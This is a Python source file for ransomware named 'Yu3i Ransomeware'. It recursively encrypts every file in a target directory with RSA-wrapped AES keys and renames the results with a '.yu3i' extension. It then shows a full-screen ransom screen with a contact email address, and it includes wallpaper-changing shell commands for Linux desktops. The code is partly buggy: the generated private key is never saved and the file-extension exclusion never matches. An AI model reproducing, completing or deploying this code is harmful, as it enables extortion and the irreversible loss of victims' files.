from Crypto.PublicKey import RSA
import os 
import time
from Crypto.Cipher import PKCS1_OAEP, AES
from pathlib import Path
import tkinter as tk
from tkinter import *
from random import randint
import base64
import asyncio


async def encrypt(datafile, publickeyfile):
	'''
	use EAX mode to allow detection of unauthorized modification
	'''
	#read data from file

	#read public key from file

	with open(datafile,'rb') as f:
		data = f.read()
	#create public key object
	key = RSA.import_key(publickeyfile)
	session_key = os.urandom(16)

	#encrypt_the session key with public key
	cipher = PKCS1_OAEP.new(key)
	encrypted_session_key = cipher.encrypt(session_key)

	#encrypt the data with the session key
	cipher = AES.new(session_key, AES.MODE_EAX)
	cipher_text,tag = cipher.encrypt_and_digest(data)

	#save encrypted data to file
	holafile = str(datafile)
	fileName= holafile.split('.')[0]
	fileExtension = 'yu3i'
	encrypted_file = fileName + "." + fileExtension
	with open(encrypted_file,"wb") as f:
		[ f.write(x) for x in (encrypted_session_key, cipher.nonce, tag, cipher_text) ]
	print(f"encrypted file saved as {encrypted_file}")

def decrypt(datafile, privatekeyfile):
	#read private key
	with open(privatekeyfile,"rb") as f:
		private_key = f.read()
	#create private key object
	key = RSA.import_key(private_key)

	#read data file
	with open(datafile, "rb") as f:
		# read session key
		encrypted_session_key,nonce,tag,cipher_text = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]

	#decrypt session key
	cipher = PKCS1_OAEP.new(key)
	session_key = cipher.decrypt(encrypted_session_key)

	#decrypt data with session key
	cipher = AES.new(session_key, AES.MODE_EAX, nonce)
	data = cipher.decrypt_and_verify(cipher_text,tag)

	#save decrypted file
	[ fileName, fileExtension ] = datafile.split('.')
	decryptedFile = fileName + '_decrypted.' + fileExtension
	with open(decryptedFile, 'wb') as f:
		f.write(data)
	print('Decrypted file saved to ' + decryptedFile)

async def scan_dir(base_dir):
    for entry in os.scandir(base_dir):
        if entry.is_file():
            yield entry
        elif entry.is_dir():
            async for file_entry in scan_dir(entry.path):
                yield file_entry

def countdown():
    root= tk.Tk()
    width = root.winfo_screenwidth() # Get screen width
    height = root.winfo_screenheight() # Get screen height

    root.title(" Yu3i Ransomeware ")
    canvas1 = tk.Canvas(root, width = width, height = height, bg='black') # Main window
    canvas1.pack()

    label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') # Title
    label1.config(font=('helvetica', int(height/20)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/15), window=label1)


    #img = tk.PhotoImage(file="lock.ppm")
    #img = img.subsample(2) 
    #img = img.zoom(1)
    #label = tk.Label(root, image=img)
    #label.config(background='black', foreground='red')
    #canvas1.create_window(width/2, height/4, window=label)


    label1 = tk.Label(root, text='YOUR IMPORTANT DOCUMENTS, DATAS, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION') # Title
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*8, window=label1)


    label1 = tk.Label(root, text='to decrypt them contact us  to dmr897780@gmail.com') # Title
    label1.config(font=('helvetica', int(height/50)))
    label1.config(background='black', foreground='red')
    canvas1.create_window(int(width/2), int(height/20)*9, window=label1)

    entry1 = tk.Entry (root) 
    root.mainloop()

def change_wallpaper(directory):
    with open(os.path.join(directory, "img.png"), 'wb') as f:
        f.write(base64.b64decode(img))
    gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'\
            .format(os.path.join(directory, "img.png"))
    
    xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" '''\
            .format(os.path.join(directory, "img.png"))
    xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"'\
            .format(os.path.join(directory, "img.png"))

    kde = """dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
var Desktops = desktops();                                                                                                                       
for (i=0;i<Desktops.length;i++) {
        d = Desktops[i];
        d.wallpaperPlugin = "org.kde.image";
        d.currentConfigGroup = Array("Wallpaper",
                                    "org.kde.image",
                                    "General");
        d.writeConfig("Image", "file://%s");
}'
""" %(os.path.join(directory, "img.png"))
    os.system(gnome)
    os.system(xfce)
    os.system(xfce1)
    os.system(kde)

async def search(directory, exclude_extension, public_key):
    async for item in scan_dir(directory):
        file_path = item.path
        file_type = item.name.lower().split('.')[-1]
        if file_type in exclude_extension:
            continue
        await encrypt(file_path, public_key)

def main():
	start_time = time.time()
	with open("publickey.pem","rb") as f:
		publickey = f.read()
	key = RSA.generate(2048)
	private_key = key.export_key()
	public_key = key.publickey().export_key()
	key0 = RSA.import_key(publickey)

	# Create a cipher object with the public key
	#cipher = PKCS1_OAEP.new(key0)

	# Encrypt the private key
	#encrypted_private_key = cipher.encrypt(private_key)
	#with open("key.txt","w") as f:
	#	f.write(encrypted_private_key)
	directory = '/home/user/Desktop/malware/yuri/data/' # CHANGE THIS
	excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
	asyncio.run(search(directory, excludeExtension, public_key))
	username = os.getlogin()
	print(username)
	end_time = time.time()
	run_time = end_time - start_time
	print(f"runtime {run_time}")
	#change_wallpaper(directory)
	countdown()





if __name__ == '__main__':
	main()
